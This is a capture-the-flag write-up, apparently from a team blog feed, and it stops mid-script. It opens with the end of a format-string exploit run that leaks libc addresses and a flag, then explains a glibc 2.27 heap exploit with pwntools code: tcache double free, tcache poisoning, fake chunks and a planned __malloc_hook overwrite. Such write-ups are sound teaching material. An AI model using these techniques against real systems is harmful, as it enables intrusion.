RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to chall2.2019.redpwn.net on port 4007: Done</span><br><span class="line">[*] LIBCBASE 0xf7dec000</span><br><span class="line">[*] PRINTF 0xf7e35020</span><br><span class="line">[*] SYSTEM 0xf7e26940</span><br><span class="line">[*] FGETS 0xf7e49620</span><br><span class="line">[*] STDOUT 0xf7f9cdfc</span><br><span class="line">[*] STDIN 0xf7f9ce00</span><br><span class="line">[*] SETBUFF 0xf7e51450</span><br><span class="line">[*] STDERR 0xf7f9cdf8</span><br><span class="line">[*] PUTS 0xf7e4b140</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x10\xa0\x0\x12\xa0\x0</span><br><span class="line">...truncated...</span><br><span class="line">$ cat flag.txt</span><br><span class="line">flag&#123;__xXxxXx__w3lc0me_t0_th3_surf4c3__xXxxXx__&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>flag{<strong>xXxxXx</strong>w3lc0me_t0_th3_surf4c3__xXxxXx__}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Black Echo&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;413&lt;/p&gt;
&lt;p&gt;Written by: blevy&lt;/p&gt;
&lt;p&gt;You are tr
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x86" scheme="https://teamrocketist.github.io/categories/Pwn/x86/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x86/Format-String/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="redpwnctf2017" scheme="https://teamrocketist.github.io/tags/redpwnctf2017/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] RedpwnCTF - penpal world</title>
    <link href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/"/>
    <id>https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/</id>
    <published>2019-08-17T03:16:39.000Z</published>
    <updated>2019-09-16T01:29:54.995Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>penpal world</p></blockquote><blockquote><p><strong>Description</strong>:<br>436</p><p>Written by: jespiron</p><p>Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~</p><p>nc chall2.2019.redpwn.net 4010<br><a href="https://mega.nz/#!r6o03YgS!a9EjWEernGYNGeWjmQZorIkwrk1C0EhdkezMu4w9-3E" target="_blank" rel="noopener">penpal_world</a><br><a href="https://mega.nz/#!myg22IDT!BIF24BAOo9TeH6fUTggyTUY2KhOq19HBRFWhERXChYA" target="_blank" rel="noopener">libc-2.27.so</a></p></blockquote><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>From the challenge is provided its <strong>binary</strong> and <strong>libc</strong>.<br>Lets first extract some information:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file penpal_world</span><br><span class="line">penpal_world: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=195416fc8622b4f9906da0915a9abb1dfde40e13, not stripped</span><br></pre></td></tr></table></figure><p>With <strong>file</strong> command we now know:</p><ul><li>ELF compiled for x86_x64 architecture.</li><li>Dynamically linked.</li><li>Not stripped.</li></ul><p>Let’s check the enabled  protections with <strong>checksec</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec penpal_world</span><br><span class="line">[*] <span class="string">'/ctf/redpwn/pwn/pepal_world/penpal_world'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Protections:</p><ul><li>FULL RELRO (<strong>GOT</strong> entries are read only we can’t overwrite them)</li><li>STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to <strong>leak</strong> it)</li><li>The Stack is not executable (We can’t execute shellcode techniques like <strong>ROP</strong> can bypass this)</li><li>PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li></ul><h3 id="Running-the-binary"><a href="#Running-the-binary" class="headerlink" title="Running the binary"></a>Running the binary</h3><p>Lets first run the binary to see how it works</p><p>We are presented with a menu where we can create,edit,discard and read a postcard:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./penpal_world</span><br><span class="line">OPTIONS</span><br><span class="line">1) Create a postcard</span><br><span class="line">2) Edit a postcard</span><br><span class="line">3) Discard a postcard</span><br><span class="line">4) Read a postcard</span><br></pre></td></tr></table></figure></p><h3 id="Analysing-the-binary-for-a-vulnerability"><a href="#Analysing-the-binary-for-a-vulnerability" class="headerlink" title="Analysing the binary for a vulnerability"></a>Analysing the binary for a vulnerability</h3><p>Using ida to check on the main loop:<br><a data-fancybox="gallery" href="https://i.imgur.com/qwc5RCS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qwc5RCS.png" alt><br></a></p><p>Lets check <strong>create_card</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/I0EbIyy.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/I0EbIyy.png" alt><br></a><br><strong>edit_card</strong> time:<br><a data-fancybox="gallery" href="https://i.imgur.com/bcLTouv.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/bcLTouv.png" alt><br></a><br>The vulnerability is in <strong>discard_card</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/uZr1mzH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/uZr1mzH.png" alt><br></a><br><strong>display</strong> function doesn’t have anything special it does control the indexes and you can print the cards as well.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>First we need to check which <strong>libc</strong> version is used on the server, since we are provided with the libc file from the challenge, we know that it’s using <strong>libc-2.27</strong> since version <strong>2.26</strong> it implements the tcache concept that is used to cache free chunks in the heap before adding them to the libc freelist. </p><p>Now all heap chunks of size &lt; 0x410 are treated as tcache chunks. When freed they go into their respective tcache bins. </p><p>The good thing about this unlike normal chunks and luckly in this libc version there is <strong>no</strong> security checks making it easier to exploit. Thus we can double free and malloc without any <strong>size</strong> checks.</p><p>The exploit plan is the following one:</p><ul><li>Leak the heap address by reading the fd pointer after freeing;</li><li>Find a way to overwrite the size of a chunk to 0x91 (so when we free it it goes to unsorted bin instead);</li><li>Fill the tcache unsorted tcache bin list (max 7);</li><li>After tcache unsorted bin is full the next free will put into a normal unsorted bin with that we can leak libc; </li><li>Tricking malloc() into returning the address of __malloc_hook ;</li><li>Overwrite __malloc_hook with the address of a one gadget ;</li><li>Trigger the hook using malloc()!</li></ul><h3 id="Setting-up-the-environment-for-pwn-ctf-challenges"><a href="#Setting-up-the-environment-for-pwn-ctf-challenges" class="headerlink" title="Setting up the environment for pwn ctf challenges"></a>Setting up the environment for pwn ctf challenges</h3><p>Now there is a small problem, if you want to debug the binary with the right <strong>libc version</strong> you either find the right linux docker container that uses that version that libc as default or you <strong>LD_PRELOAD</strong> it, to do it you need to compile that specific version. </p><p>for example to do this manually:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so</span><br><span class="line">patchelf --<span class="built_in">set</span>-interpreter /tmp/ld-2.27.so ./<span class="built_in">test</span></span><br><span class="line">LD_PRELOAD=./libc.so.6 ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>Or using pwntools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process([<span class="string">"/path/to/ld.so"</span>, <span class="string">"./test"</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/path/to/libc.so.6"</span>&#125;)</span><br></pre></td></tr></table></figure><p>Luckily someone did the dirty work for us, this docker container contains multiple compiled libcs and also the default libc coming with the system is libc-2.27.so the one we need. </p><p>The github link: <a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a><br>The docker hub link: <a href="https://hub.docker.com/r/skysider/pwndocker" target="_blank" rel="noopener">https://hub.docker.com/r/skysider/pwndocker</a></p><p>I don’t recommend going with the <strong>LD_PRELOAD</strong> way, sure you can debug it with the right version but remember this, some <strong>offsets</strong> when leaking libc will be different from the server ones because you’re preloading it with the <strong>ld.so</strong>, if you choose to go this way remember to adapt those offsets to the right ones.</p><h3 id="Leak-heap-address"><a href="#Leak-heap-address" class="headerlink" title="Leak heap address"></a>Leak heap address</h3><p>This the structure of of a chunk:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start</span><br><span class="line">|          PREV_SIZE OR USER DATA       |</span><br><span class="line">+---------------------------------+-+-+-+</span><br><span class="line">| CHUNK SIZE                      |A|M|P|</span><br><span class="line">+---------------------------------+-+-+-+ </span><br><span class="line">|           FORWARD POINTER(FD)         | &lt;-- All freechunks</span><br><span class="line">|            BACK POINTER(BK)           | &lt;-- normalchunk or larger</span><br><span class="line">|   NEXT BIGGER POINTER (fd_nextsize)   | &lt;-- Only if largechunk</span><br><span class="line">|   PREVIOUS SMALLER PTR(bk_nextsize)   | &lt;-- Only if largechunk</span><br><span class="line">| -  -  -  -  -  -  -  -  -  -  -  -  - | &lt;-- End of this chunk.</span><br><span class="line">|               PREV_SIZE               |</span><br><span class="line">+---------------------------------------+</span><br></pre></td></tr></table></figure></p><p>The mallocs we can do are limited to 0x48 size, which is within tcache fast bin range. Since it’s a tcache bin freed items will be kept in a single-linked list. When the first fastchunk is <strong>free()</strong>‘d, it sets its <strong>FD pointer</strong> to NULL because there wasn’t any freed item yet, if we free a second item the <strong>FD pointer</strong> will be set to the previous chunk freed, by using <strong>UAF</strong> vulnerability we can print this pointer thus leaking it’s heap address, let’s start by writing our python script to do this.</p><p>Some introductory stuff we can add I’m using <strong>pwntools</strong> which is a very handy framework for <strong>pwn</strong> you can find it at <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host, port = <span class="string">"chall2.2019.redpwn.net"</span>, <span class="string">"4010"</span></span><br><span class="line">filename = <span class="string">"./penpal_world"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br></pre></td></tr></table></figure><p>Since <strong>PIE</strong> is enabled we need to get its base address, to debug it in gdb we can use this function to do it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>If you’re <strong>LD_PRELOAD</strong> the libc version you need to change the index of memory_map to 5:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">5</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>If you’re using <strong>gdb.attach</strong> from pwntools and you’re inside a docker container remember it won’t detect the terminal to open the specific <strong>gdb window</strong>, we can use tmux for example but we need to specified it by doing this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0xb11</span>])</span><br></pre></td></tr></table></figure><p>Open two windows logged in the docker container, the 1st one run your script and on the 2nd one open tmux, when running the script <strong>gdb</strong> will automaticity open with the specified breakpoints we set in the debug list:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/yxHU7rd.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yxHU7rd.png" alt><br></a></p><p>Now that we can debug and open gdb in a very easy way it’s time to write the functions to add,free,edit and print:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'Write.\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">4</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br></pre></td></tr></table></figure><p>To leak an address we can for example allocate a chunk and then double free it, we then proceed to read its fd pointer which will point to the first freed chunk, this chunks will be inserted into a tcache bin due to its size of 0x48.</p><p>Lets put a breakpoint on free and look how the first chunk looks like before free it the first time:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><p>Gdb output:<br><a data-fancybox="gallery" href="https://i.imgur.com/brUzymx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/brUzymx.png" alt><br></a></p><p>Now let’s take a look after the 1st free:<br><a data-fancybox="gallery" href="https://i.imgur.com/bZTPxZ1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/bZTPxZ1.png" alt><br></a></p><p>Lets check how tcache fast bin list is looking by using tcachebins on pwngdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/iWd1MMW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/iWd1MMW.png" alt><br></a></p><p>After 2nd free (Double free)<br><a data-fancybox="gallery" href="https://i.imgur.com/9jy4cUV.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9jy4cUV.png" alt><br></a></p><p>Lets check again how tcache bin list is looking by using tcachebins on pwngdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/kjCR5aR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/kjCR5aR.png" alt><br></a></p><p>Now if we read the card at index 0 we will get a heap leak!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">log.info(<span class="string">'0x%x'</span>%heap)</span><br></pre></td></tr></table></figure><p>Results:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/penpal_world'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./penpal_world'</span>: pid 2596</span><br><span class="line">[*] 0x55d9117e3200</span><br><span class="line">[*] Stopped process <span class="string">'./penpal_world'</span> (pid 2596)</span><br></pre></td></tr></table></figure></p><h3 id="LEAKING-LIBC"><a href="#LEAKING-LIBC" class="headerlink" title="LEAKING LIBC"></a>LEAKING LIBC</h3><p>We can only do mallocs of size <strong>0x48</strong>, we somehow need to overwrite the size of one chunk because fastbin chunk sizes will only get us heap addresses, in order to leak a libc address we need a unsorted bin chunk size for example 0x91 will do it. </p><p>Perhaps since this version of libc uses <strong>tcache</strong>, at every chunk bellow 0x410 are treated as it was a fastbin chunk even if we free a 0x91 chunk we will not get a libc address, luckily there is a <strong>limit</strong> to the tcache which is <strong>7</strong>  we need to fill a <strong>tcache bin</strong> of size 0x91, we can do it by freeing that chunk 7 times the 8th time will be treated as an unsorted bin updating both fd and bk pointers into libc addresses.</p><p>But to overwrite the size of a chunk we need to use the <strong>tcache poisoning attack</strong> you can find an example <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_poisoning.c" target="_blank" rel="noopener">here</a>.</p><p>In the end we want malloc to return an arbitrary address where we can start writing stuff into an address that is able  to overwrite the size of 0x51 to 0x91, when malloc executes it will try to find a chunk in the <strong>tcache bin</strong> of that size so it can reuse the same space in memory from previous freed chunks, if we <strong>modify</strong> the fd pointer with <strong>UAF</strong>, malloc will instead return the pointer we modified getting us an <strong>arbitrary write</strong>.</p><p>First we need to find a cool address we can write to, we already leaked a heap address, we just need to find the offset near the 0x51 size, we can do it with this:<br><a data-fancybox="gallery" href="https://i.imgur.com/Ya6ZWlt.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ya6ZWlt.png" alt><br></a></p><p>The code to overwrite the size would look like this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x90</span>)) <span class="comment"># change the fd pointer to get arbitrary write with malloc</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># NEW ALLOCATION (NO MEMORY REUSE) ALLOCATE CHUNK B and prevent merge with top chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># OVERWRITES THE SIZE OF CHUNK 'B'</span></span><br></pre></td></tr></table></figure></p><p>After changing the <strong>FD</strong> with edit we need to do two mallocs until we get the right pointer, because on the first two frees the single linked list of the tcache chunks(0x50) is like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x60 -&gt; heap+0x60 &lt;- 0x0</span><br></pre></td></tr></table></figure><p>After editing the FD with <strong>heap+0x90</strong> we get this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span><br></pre></td></tr></table></figure><p>The list after the first malloc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x90 &lt;- 0x0</span><br></pre></td></tr></table></figure></p><p>The list after the second malloc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0 (empty)</span><br></pre></td></tr></table></figure></p><p>The next step is to fill tcache bin (0x90) remember the max is 7 so we need to free 7 times. </p><p>Also we need to add 2 new chunks and create two fake chunks in the end to bypass the security check from <strong>int_free</strong>, since it isn’t a tcache bin we need to worry about that. </p><p>The size field of the next chunk should correspond to the size that has overwritten the size of chunk B and with a valid size with its flag prev_in_use set to 1.</p><p>The <strong>lowest</strong> bit of size is the prev_in_use flag, 0x51 represented in binary is 0101000<strong>1</strong>, the lowest bit is set to one.</p><p>PREV_INUSE, <strong>records</strong> whether the previous chunk is allocated. In general, the P bit of the size field of the <strong>first allocated memory block</strong> in the heap is set to <strong>1</strong> to prevent access to the previous <strong>illegal memory</strong>. When the P bit of the size of a chunk is 0, we can get the <strong>size</strong> and <strong>address</strong> of the previous chunk through the <strong>prev_size</strong> field.</p><p>The Chunk C is for this security check <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280</a><br><a data-fancybox="gallery" href="https://i.imgur.com/uGz3Eu9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/uGz3Eu9.png" alt><br></a></p><p>The Chunk D is to prevent going into unlink at <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4303" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4303</a> :</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Ir1dvEf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ir1dvEf.png" alt><br></a></p><p>if we set nextinuse into 1 we won’t get an error at <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405</a> because we don’t even enter at unlink<br><a data-fancybox="gallery" href="https://i.imgur.com/biRvmS1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/biRvmS1.png" alt><br></a></p><p>One final thing, we already knew that we needed to set a fake chunk at chunk C with prev_in_use to 1 but why the size of 0x50 ? as you can see the function that calculates the offset to the <strong>prev_in_use</strong> of the fake chunk at chunk D uses function <strong>inuse_bit_at_offset</strong> which uses the size of previous 0x50(variable s) to find chunks D prev_in_use.<br><a data-fancybox="gallery" href="https://i.imgur.com/OqsTjG3.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/OqsTjG3.png" alt><br></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,(<span class="string">'C'</span>*<span class="number">0x30</span> +p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>))) <span class="comment"># TO PREVENT double free or corruption (!prev)</span></span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">edit(<span class="number">1</span>, (<span class="string">'D'</span>*<span class="number">0x30</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x01</span>))) <span class="comment"># TO PREVENT corrupted size vs. prev_size (as long as prev_in_use is set any values work (0x1,0x51,0x61 etc..)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment"># Filling tcachebin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># free 